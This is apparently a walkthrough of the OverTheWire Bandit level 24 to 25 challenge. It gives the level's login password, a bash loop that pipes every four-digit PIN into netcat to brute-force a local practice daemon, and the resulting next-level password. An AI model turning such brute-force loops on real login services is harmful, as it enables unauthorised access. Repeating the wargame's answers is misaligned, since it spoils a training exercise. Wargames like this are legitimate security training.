# Bandit Level 24 -> Level 25 #

https://overthewire.org/wargames/bandit/bandit25.html

## SSH Access Details ##
**Username:**  bandit24

**Password:**  VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
#

## Level Goal : ##
>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
>You do not need to create new connections each time

#  
## PROCEDURE : ##

```console
bandit24@bandit:/tmp/myscript$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 1111
Wrong! Please enter the correct pincode. Try again.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 2222
Wrong! Please enter the correct pincode. Try again.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 3333
Wrong! Please enter the correct pincode. Try again.
```

```console
bandit24@bandit:/tmp/myscript$ mkdir /tmp/scriptdir
bandit24@bandit:/tmp/myscript$ cd /tmp/scriptdir
bandit24@bandit:/tmp/scriptdir$ touch myscript.sh
bandit24@bandit:/tmp/scriptdir$ nano myscript.sh
```

```bash
#!/bin/bash

for i in {00..99};
do
  echo $i
done
```

```console
bandit24@bandit:/tmp/scriptdir$ chmod 777 myscript.sh
```

```console
bandit24@bandit:/tmp/scriptdir$ ./myscript.sh
00
01
02
03
04
05
06
07
08
09
10
11
12
...
```


```bash
#!/bin/bash
for i in {0000..9999};
do
  echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar " $i;
done | nc localhost 30002
```

```
bandit24@bandit:/tmp/scriptdir$ ./myscript.sh
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
...
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
```

